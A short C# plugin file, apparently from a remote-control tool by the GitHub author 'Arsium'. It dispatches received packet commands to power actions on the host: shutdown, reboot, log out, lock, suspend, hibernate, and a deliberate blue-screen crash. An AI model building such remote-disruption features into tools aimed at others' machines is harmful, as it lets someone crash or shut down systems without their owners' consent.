using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.CurrentPacket.PacketType) 
            {
                case PacketType.POWER_SHUTDOWN:
                    PowerManager.ShutDown();
                    break;

                case PacketType.POWER_REBOOT:
                    PowerManager.Reboot();
                    break;

                case PacketType.POWER_LOG_OUT:
                    PowerManager.LogOut();
                    break;

                case PacketType.POWER_BSOD:
                    PowerManager.BSOD();
                    break;

                case PacketType.POWER_LOCK_WORKSTATION:
                    PowerManager.LockWorkstation();
                    break;

                case PacketType.POWER_SUSPEND:
                    PowerManager.Suspend();
                    break;

                case PacketType.POWER_HIBERNATE:
                    PowerManager.Hibernate();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}